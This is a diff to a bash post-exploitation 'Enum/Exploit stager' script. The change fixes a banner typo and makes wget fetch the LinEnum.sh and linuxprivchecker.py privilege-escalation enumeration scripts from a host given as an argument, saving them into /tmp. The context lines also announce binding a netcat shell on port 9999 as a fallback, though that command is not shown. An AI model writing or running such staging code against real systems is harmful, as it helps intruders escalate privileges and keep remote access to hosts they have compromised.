@@ -20,7 +20,7 @@ if [ -z "$1" ]
   # banner
   echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
   echo "[]_________________________________________________________________________________________[]"
-  echo " Tagreting file source: $1"
+  echo " Targetting file source: $1"
   echo "[]_________________________________________________________________________________________[]"
   sleep 2s
   
@@ -31,12 +31,12 @@ if [ -z "$1" ]
 
   # download linenum.sh
   echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
-  wget $LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh
+  wget $1LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh
 
 
   # download LinxPrivChecker.py
   echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
-  wget $linuxprivchecker.py -O /tmp/LPC.py
+  wget $1linuxprivchecker.py -O /tmp/LPC.py
 
   # build a NC bind shell incase we lose a shell
   echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
